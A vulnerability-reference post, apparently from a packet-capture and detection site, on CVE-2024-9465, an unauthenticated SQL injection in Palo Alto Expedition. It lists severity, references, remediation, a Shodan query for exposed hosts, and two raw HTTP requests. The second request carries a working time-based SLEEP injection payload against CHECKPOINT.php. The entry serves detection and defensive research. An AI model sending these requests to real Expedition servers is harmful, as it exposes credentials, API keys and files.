---
layout: post
cve_id: CVE-2024-9465
title: Palo Alto Expedition - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-9465.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-9465.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: high
impact: 'Unauthenticated attackers can exploit SQL injection to reveal Expedition
  database contents including password hashes, usernames, device configurations, and
  API keys, and create or read arbitrary files on the system.

  '
remediation: 'Apply security updates from Palo Alto Networks as specified in security
  advisory PAN-SA-2024-0010 to address the SQL injection vulnerability in Expedition.

  '
reference:
- https://security.paloaltonetworks.com/PAN-SA-2024-0010
- https://github.com/horizon3ai/CVE-2024-9465/tree/main
- https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise/
- https://nvd.nist.gov/vuln/detail/CVE-2024-9465
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
  cvss-score: 8.2
  cve-id: CVE-2024-9465
  cwe-id: CWE-89
  epss-score: 0.94286
  epss-percentile: 0.99934
metadata:
  verified: true
  max-request: 2
  vendor: paloaltonetworks
  product: expedition
  shodan-query: http.favicon.hash:1499876150
tags:
- time-based-sqli
- cve
- cve2024
- palo-alto
- sqli
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
An SQL injection vulnerability in Palo Alto Networks Expedition allows an unauthenticated attacker to reveal Expedition database contents, such as password hashes, usernames, device configurations, and device API keys. With this, attackers can also create and read arbitrary files on the Expedition system.


## üåê HTTP Request
```nohighlight
POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Content-Length: 52
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=get&type=existing_ruleBases&project=pandbRBAC
```

```nohighlight
POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=import&type=test&project=pandbRBAC&signatureid=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(6)))test)
```

